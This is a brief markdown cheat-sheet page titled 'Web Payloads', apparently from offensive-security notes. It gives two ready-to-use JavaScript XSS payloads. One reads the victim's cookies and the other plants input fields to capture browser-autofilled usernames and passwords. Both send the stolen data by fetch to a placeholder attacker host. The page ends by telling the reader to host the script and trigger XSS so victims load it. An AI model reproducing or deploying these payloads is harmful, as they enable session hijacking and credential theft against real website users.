---
title: Web Payloads
published: true
---



### [](#header-3)Cookie Stealer:

```js
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://<LHOST-IP>/exfil?data=" + encodedCookie)
```

[](#header-3)Steal Saved Passwords:

```js
let body = document.getElementsByTagName("body")[0]
var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";
var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
//p.style.opacity = "0";
body.append(u)
body.append(p)

setTimeout(function(){ 
fetch("http://<LHOST-IP>/k?u=" + u.value + "&p=" + p.value)
}, 5000);
```

Host these files as a .js file, and try to trigger XSS to have the victim reach out and load the js.